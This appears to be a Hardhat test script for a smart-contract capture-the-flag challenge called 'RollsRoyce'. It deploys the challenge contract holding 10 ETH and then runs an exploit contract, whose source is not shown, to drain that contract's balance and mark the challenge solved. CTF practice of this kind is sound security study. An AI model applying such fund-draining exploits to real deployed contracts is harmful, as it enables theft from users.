const { ethers } = require("hardhat");
const { expect } = require("chai");
const { getBalance } = require("./utils/helpers.js");

async function deployContract(deployer) {
  // RollsRoyce contract constructor input
  let amountOfEth = ethers.utils.parseUnits("10", "ether");

  // Deploy
  const RollsRoyce = await ethers.getContractFactory("RollsRoyce", deployer);
  const rollsRoyce = await RollsRoyce.deploy({
    value: amountOfEth,
  });
  return [rollsRoyce];
}

async function main() {
  console.log("CHALLENGE 2 - RollsRoyce \n");

  let [deployer, challenger] = await ethers.getSigners();
  let [rollsRoyce] = await deployContract(deployer);

  // Checking if challenge is solved by calling 'isSolved' RollsRoyce function
  expect(await rollsRoyce.isSolved()).to.be.false;

  console.log(
    "Initial status of the challenge. Is challenge solved?:",
    await rollsRoyce.isSolved(),
    "\n"
  );

  console.log(
    "Initial balance of the challenge contract:",
    await getBalance(rollsRoyce.address),
    "ETH\n"
  );

  // Deploying exploit with initial balance of 3 ethers. Amount required for calling RollsRoyce 'guess' function (3x)
  let threeEth = ethers.utils.parseUnits("3", "ether");
  const Exploit = await ethers.getContractFactory("RollsExploit", challenger);
  const exploit = await Exploit.deploy(rollsRoyce.address, { value: threeEth });

  await exploit.connect(challenger).attack();

  expect(await rollsRoyce.isSolved()).to.be.true;
  console.log(
    "Final status of the challenge. Is challenge solved?:",
    await rollsRoyce.isSolved(),
    "\n"
  );
  console.log(
    "Final balance of the challenge contract:",
    await getBalance(rollsRoyce.address),
    "ETH\n"
  );
}

main();
